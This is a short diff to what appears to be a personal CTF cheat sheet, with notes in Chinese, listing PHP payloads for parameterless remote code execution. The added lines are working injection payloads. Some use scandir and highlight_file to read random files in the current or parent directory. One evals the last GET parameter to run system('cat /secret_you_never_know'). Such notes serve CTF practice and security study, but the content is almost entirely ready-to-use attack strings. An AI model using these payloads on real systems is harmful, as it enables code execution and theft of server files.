@@ -3,6 +3,12 @@
 #无参rce 
 `command=show_source(array_rand(array_flip(scandir(getcwd()))));`
 
+随机读取当前目录文件
+`highlight_file(array_rand(array_flip(scandir(getcwd()))));`
+上一级文件
+`highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));`
+读取最后一个get参数
+`echo(eval(end(current(get_defined_vars()))));&a=system("cat /secret_you_never_know");`
 
 ### pain
 #ongl #java 0
